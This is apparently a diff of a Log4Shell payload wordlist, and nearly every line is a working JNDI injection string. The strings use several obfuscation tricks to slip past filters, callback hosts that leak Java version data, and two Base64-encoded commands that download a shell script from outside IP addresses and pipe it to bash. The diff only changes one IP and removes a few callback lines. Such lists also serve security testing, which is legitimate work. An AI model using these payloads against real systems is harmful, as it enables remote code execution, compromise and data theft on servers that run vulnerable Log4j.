@@ -26,7 +26,7 @@ ${jndi:${lower:l}${lower:d}a${lower:p}://example.com/
 ${jndi:ldap://127.0.0.1:1389/i_rock}
 ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}
 ${jndi:ldap://aa895bba3900.bingsearchlib.com:39356/a}
-/$%7Bjndi:ldap://45.130.229.168:1389/Exploit%7D
+/$%7Bjndi:ldap://127.0.0.1:1389/Exploit%7D
 /$%7Bjndi:ldap://x-ios-validation.com.lc1wnt7yguuuk0qurdw600boffl59u.burpcollaborator.net%7D
 jn${env::-}di:
 jn${date:}di${date:':'}
@@ -47,11 +47,6 @@ ${jndi:ldap://${env:JAVA_VERSION}.5ou7zt0bj640uqc0bsy1hvyrpiv8jx.burpcollaborato
 ${jndi:ldap://host:1389/${java:version}}
 /$%7bjndi:ldap:/$%7blower:/%7d192.168.139.1:1389/o=tomcat%7d$%7blower:/%7d/
 ${jndi:ldap://015ed9119662[.]bingsearchlib[.]com:39356/a}
-${jndi:ldap://32fce0c1f193[.]bingsearchlib[.]com:39356/a}
-${jndi:ldap://3be6466b6a20[.]bingsearchlib[.]com:39356/a}
-${jndi:ldap://6c8d7dd40593[.]bingsearchlib[.]com:39356/a}
-${jndi:ldap://7faf976567f5[.]bingsearchlib[.]com:39356/a}
-${jndi:ldap://e86eafcf9294[.]bingsearchlib[.]com:39356/a}
 ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/KGN1cmwgLXMgODAuNzEuMTU4LjEyL2xoLnNofHx3Z2V0IC1xIC1PLSA4MC43MS4xNTguMTIvbGguc2gpfGJhc2g=}
 ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC9bdmljdGltIElQXTpbdmljdGltIHBvcnRdfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0L1t2aWN0aW0gSVBdOlt2aWN0aW0gcG9ydF0pfGJhc2gK}
 ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/ass}
